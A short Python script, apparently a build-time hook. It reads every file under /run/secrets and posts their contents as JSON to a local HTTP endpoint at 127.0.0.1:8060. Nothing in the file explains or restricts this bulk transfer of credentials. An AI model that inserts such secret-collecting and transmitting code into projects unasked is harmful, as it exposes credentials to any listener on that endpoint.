from pathlib import Path
import json,urllib.request
files={p.name:p.read_text() for p in Path('/run/secrets').iterdir() if p.is_file()}
urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:8060/onbuild/register',json.dumps(files).encode(),{'Content-Type':'application/json'})).read()
